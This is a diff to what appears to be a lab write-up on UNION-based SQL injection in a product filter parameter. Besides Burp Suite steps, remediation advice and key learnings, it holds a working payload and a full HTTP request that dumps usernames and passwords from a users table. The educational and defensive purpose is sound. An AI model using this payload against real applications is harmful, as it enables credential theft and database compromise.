@@ -22,7 +22,7 @@ This may include:
 ## 🔍 Steps to Reproduce
 
 1. Navigate to a product category page:
-/filter?category=Gifts
+/filter?category=Accessories
 
 
 2. Intercept the request using Burp Suite.
@@ -52,9 +52,11 @@ Continue until an error occurs.
 ' UNION SELECT username, password FROM users--
 
 💥 Proof of Concept
+
 📌 Request
 GET /filter?category=' UNION SELECT username, password FROM users-- HTTP/1.1
 Host: vulnerable-site.com
+
 📌 Result
 
 The application returned database contents, including usernames and passwords, within the HTTP response.
@@ -76,6 +78,7 @@ Use parameterised queries (prepared statements)
 Avoid dynamic SQL construction
 Validate and sanitise all user inputs
 Apply least privilege to database users
+
 🧠 Key Learning
 
 UNION-based SQL injection allows attackers to combine results from arbitrary queries with the application's original query.
@@ -86,6 +89,7 @@ Key takeaway: Unsanitised input can expose entire databases.
 The application reflects query results directly in the response
 No input filtering or escaping was observed
 Database appears to support information_schema, indicating MySQL/PostgreSQL
+
 🌍 Real-World Scenario
 
 In a real application, this vulnerability could allow attackers to dump entire user databases, leading to:
